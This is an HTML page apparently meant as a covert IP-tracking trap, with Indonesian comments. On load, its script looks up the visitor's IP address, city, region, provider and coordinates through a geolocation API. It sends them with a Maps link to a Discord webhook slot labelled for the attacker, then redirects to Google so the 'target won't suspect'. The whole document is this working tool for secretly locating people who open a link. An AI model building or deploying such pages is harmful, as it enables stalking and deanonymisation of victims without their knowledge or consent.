<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>VOREXX GHOST INJECTOR</title>
    <style>
        body { background: #000; color: #f00; font-family: 'Courier New', monospace; text-align: center; padding-top: 50px; }
        .box { border: 2px solid #f00; display: inline-block; padding: 20px; box-shadow: 0 0 20px #f00; }
        h1 { font-size: 20px; border-bottom: 1px solid #f00; margin-bottom: 20px; }
        #log { font-size: 10px; text-align: left; color: #0f0; }
        .loader { animation: blink 0.5s infinite; }
        @keyframes blink { 50% { opacity: 0; } }
    </style>
</head>
<body>

<div class="box">
    <h1>[ TRACKING SYSTEM ACTIVE ]</h1>
    <div id="log">
        > INITIALIZING BYPASS...<br>
        > SCANNING IP ADDRESS...<br>
        <span class="loader">> WAITING FOR SYNC...</span>
    </div>
</div>

<script>
    // FUNGSI GHOST TRACKING (BYPASS GPS)
    async function ghostTrack() {
        try {
            // Kita pake API IP Geolocation (Tembus meski GPS Mati)
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();

            const result = {
                ip: data.ip,
                city: data.city,
                region: data.region,
                provider: data.org,
                lat: data.latitude,
                lon: data.longitude,
                map: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
            };

            // LOGIKA PENGIRIMAN DATA:
            // Lo bisa ganti URL ini pake Webhook Discord lo biar data masuk ke HP lo langsung
            const webhookURL = "MASUKKAN_WEBHOOK_DISCORD_LO_DI_SINI";
            
            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `**[VOREXX TARGET LOCKED]**\nIP: ${result.ip}\nLokasi: ${result.city}, ${result.region}\nProvider: ${result.provider}\nMaps: ${result.map}`
                })
            });

            // Target gak bakal curiga, arahkan ke Google
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 1000);

        } catch (e) {
            window.location.href = "https://www.google.com";
        }
    }

    ghostTrack();
</script>

</body>
</html>
